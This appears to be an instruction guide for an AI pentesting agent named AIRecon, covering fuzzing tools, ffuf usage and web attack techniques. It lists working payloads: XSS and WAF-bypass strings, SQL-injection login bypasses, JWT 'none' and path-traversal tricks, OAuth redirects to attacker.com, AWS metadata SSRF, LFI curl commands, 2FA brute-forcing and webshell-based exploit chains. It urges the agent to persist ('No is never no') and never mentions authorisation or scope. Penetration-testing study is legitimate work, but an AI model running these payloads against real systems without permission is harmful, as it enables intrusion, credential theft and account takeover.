# Advanced Fuzzing & Expert Testing Guide

## Built-in Python Fuzzing Tools (Use These First)

AIRecon has three built-in fuzzing tools that run directly inside the agent — no shell needed:

| Tool | When to Use | Speed |
|---|---|---|
| `quick_fuzz` | First pass on any URL — auto-discovers params, tests SQLi/XSS/SSTI/Path Traversal | Fast |
| `advanced_fuzz` | When you know specific params and vuln types to test | Medium |
| `deep_fuzz` | After quick/advanced finds hints — discovers multi-step exploit chains (SQLi→RCE, XSS→Cookie Steal) | Slow but thorough |
| `generate_wordlist` | Before ffuf — saves targeted exploit payload wordlist (SQLi/XSS/SSTI/SSRF/etc.) to `output/` | Instant |

### Decision Flow

```
New endpoint discovered?
    ↓
1. quick_fuzz(target=url)          ← always start here, no setup needed
    ↓
   Got findings? → deep_fuzz(target=url)   ← deeper chain analysis
   No findings?  → advanced_fuzz(target=url, parameters=[...], vuln_types=[...])
    ↓
2. generate_wordlist(output_file="sqli.txt", vuln_types=["sql_injection","xss"])
   → ffuf -u "url?param=FUZZ" -w output/sqli.txt -mc 200,302,500
```

### Examples

```
# Quick scan — no param knowledge needed
quick_fuzz(target="https://target.com/search?q=test")

# Deep chain discovery after finding XSS hint
deep_fuzz(target="https://target.com/api/comment", params=["body","title"])

# Generate targeted SQLi+XSS payload wordlist then use with ffuf
generate_wordlist(output_file="web_payloads.txt", vuln_types=["sql_injection","xss","ssti"])
execute: ffuf -u "https://target.com/api?q=FUZZ" -w /workspace/target/output/web_payloads.txt -mc 200,500

# Generate all payloads (no filter) for broad coverage
generate_wordlist(output_file="all_payloads.txt")
execute: ffuf -u "https://target.com/search?q=FUZZ" -w /workspace/target/output/all_payloads.txt -mr "error|warning|exception"
```

### Available vuln_types for generate_wordlist

```
sql_injection, xss, command_injection, path_traversal, ssti,
xxe, ssrf, idor, mass_assignment, parameter_pollution,
jwt, graphql, race_condition
```

## Zero-Day Discovery Strategy

### 1. Intelligent Fuzzing

When standard tools fail, use intelligent fuzzing:

CRITICAL ffuf flag note: ffuf uses -rate (NOT -rl). -rl does NOT exist in ffuf.
  Wrong: ffuf ... -rl 100    ← "flag provided but not defined: -rl"
  Correct: ffuf ... -rate 100
Also: ALWAYS add -noninteractive for agent use (prevents interactive console hanging).

```
# Fuzz parameters with mutations
ffuf -u "https://target.com/api?PARAM=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mr "error|exception|warning" -t 30 -rate 50 -noninteractive

# Fuzz with payloads
ffuf -u "https://target.com/search?q=FUZZ" -w xss_payloads.txt -fc 400,404 -t 30 -rate 50 -noninteractive

# Fuzz HTTP methods
for method in GET POST PUT DELETE PATCH; do curl -X $method "https://target.com/api"; done

# Fuzz headers
ffuf -u "https://target.com/" -H "FUZZ: test" -w /usr/share/seclists/Discovery/Web-Content/burp-http-headers.txt -t 20 -rate 30 -noninteractive
```

### 2. Parameter Pollution Testing

Test for HPP (HTTP Parameter Pollution):
```
?id=1&id=2
?id=1&id=1
?id=1|id=2
?id=1%26id=2
```

### 3. Mass Assignment Testing

Try adding extra parameters:
```
# Add admin parameters
POST /user/update
user[name]=test&role=admin
user[name]=test&is_admin=1
user[name]=test&privileges[]=admin

# Add price manipulation
POST /checkout
price=100&discount=999
price=-100
amount=0.01
```

### 4. Bypass Techniques

#### WAF Bypass
```
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Polygot
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

#### Auth Bypass
```
# SQLi in login
admin' OR '1'='1
' OR 1=1--
" OR "1"="1

# JWT bypass
{"alg":"none","typ":"JWT"}
{"alg":"HS256","typ":"JWT","kid":"../../../../../etc/passwd"}

# OAuth redirect
https://target.com/oauth?redirect_uri=https://attacker.com
https://target.com/oauth?redirect_uri=https://target.com.attacker.com
```

### 5. Race Condition Testing

Use Burp Repeater or turbo-intruder:
```
# Send same request 10 times simultaneously
# Test: gift card balance, password reset, coupon reuse
```

## Expert Intuition Patterns

### High-Probability Vulnerability Locations

Based on experience, these are MOST LIKELY to be vulnerable:

1. **Authentication Endpoints**
   - `/login`, `/signin`, `/auth`
   - `/forgot-password`, `/reset-password`
   - `/register`, `/signup`

2. **API Endpoints**
   - `/api/v1/*`
   - `/api/admin/*`
   - `/api/user/*`
   
3. **ID Parameters**
   - Any parameter named `id`, `user_id`, `order_id`
   - Often vulnerable to IDOR

4. **Search/Filter**
   - `/search`, `/query`, `/find`
   - Often XSS or SQLi

5. **File Operations**
   - `/upload`, `/download`, `/view`
   - Often LFI, RCE, SSRF

6. **Redirects**
   - `redirect`, `callback`, `return`, `next`
   - Often open redirect or SSRF

### Expert Testing Order

Don't test randomly! Follow this ORDER:

```
1. IDOR (easiest to find)
   - Change IDs in: profile, orders, documents
   
2. XSS (high impact)
   - Search, comment, profile fields
   
3. SQLi (critical)
   - Login, search, filters
   
4. Auth bypass
   - JWT, OAuth, session
   
5. Business logic (highest impact)
   - Price manipulation
   - Race conditions
```

## Real-Time Response Analysis

### What to Look For

```
# Error messages (SQLi, RCE)
"SQL syntax", "mysql_fetch", "ORA-", "unterminated"
"Parse error", "undefined", "fatal error"

# Information disclosure
"Warning:", "Notice:", "Stack trace:"
"/etc/passwd", "c:\windows"

# Behavior changes
- Different status code
- Different content length
- Different response time
- New cookies set
- New redirects
```

### Immediate Actions on Anomaly

```
IF error in response → Try escalation (SQLi, RCE)
IF redirect → Test open redirect, SSRF  
IF timeout → Test DoS, slow Loris
IF longer response → Test for data disclosure
IF cookies set → Test for authentication issues
```

## Creative Exploit Chaining

### Known Chains

1. **SSRF → AWS Metadata**
   ```
   SSRF (port 80/443) → AWS metadata (169.254.169.254) → Credentials → Full AWS compromise
   ```

2. **IDOR + Broken Auth**
   ```
   IDOR (change user_id) + Session fixation → Account takeover
   ```

3. **XSS + CSRF**
   ```
   XSS (stored) + CSRF token theft → Account takeover
   ```

4. **File Upload + LFI**
   ```
   Upload restriction bypass → Webshell → LFI → Database credentials → Full compromise
   ```

5. **JWT + SQLi**
   ```
   JWT algorithm confusion → Forge token → SQLi in user context → Admin access
   ```

## Manual Testing Checklist

Run through this for EVERY target:

```
☐ Test all ID parameters (IDOR)
☐ Test all input fields (XSS)
☐ Test all search parameters (XSS, SQLi)
☐ Test authentication endpoints (SQLi, Auth bypass)
☐ Test file upload (RCE)
☐ Test redirects (Open redirect, SSRF)
☐ Test headers (SSRF, CRLF)
☐ Test APIs (IDOR, BOLA)
☐ Test business logic (Price, quantity)
☐ Test race conditions (Time-based)
```

## Response Time Analysis

Use timing to detect vulnerabilities:

```
SQLi (time-based):
?param=1' AND SLEEP(5)-- (5 second delay = vulnerable)

Blind XSS:
?comment=<script>... (check your callback server)

Race Condition:
Send 10 requests simultaneously
Check if balance updated correctly
```

## Expert Tips

1. **Always check source** - View source reveals hidden params, comments, secrets
2. **Check JavaScript** - API endpoints, hardcoded keys, validation logic
3. **Check mobile API** - Often less protected than web
4. **Check staging/backup** - /staging, /test, /backup, /old
5. **Check subdomains** - Often forgotten, less secured
6. **Check third-party** - Embedded content, plugins, integrations

## Creative Techniques

### Bypass 2FA
```
- Response manipulation: {"code":"1234","success":false} → {"code":"1234","success":true}
- Lack of rate limiting: Request 0000-9999 codes
- Backup codes: Use instead of 2FA
- Token reuse: Use old token after disable 2FA
```

### Bypass WAF
```
- Use HEAD instead of GET
- HTTP/0.9 (no Host required)
- Imperial colon: GET /:80/index.html
- Unicode variation: Ð instead of d
```

### Bypass Login
```
- Double encoding: %2527 instead of %27
- Unicode: Ð vs d
- CRLF injection: /login\r\nX-Rewrite
```

## Always Remember

1. **Test the UNEXPECTED** - Parameters you wouldn't think of
2. **Chain vulnerabilities** - One finding + another = critical
3. **Think like developer** - What would I miss?
4. **Check everything twice** - Burp Scanner finds 30%, you find 70%
5. **No is never no** - Try harder, try differently

## Interactive Testing Commands

When you need to verify manually:

```bash
# Test XSS manually
curl "https://target.com/search?q=<script>alert(1)</script>"

# Test SQLi manually  
curl "https://target.com/id=1'"

# Test LFI manually
curl "https://target.com/file=../../../etc/passwd"

# Test SSRF manually
curl "http://target.com/?url=http://169.254.169.254/latest/meta-data"
```
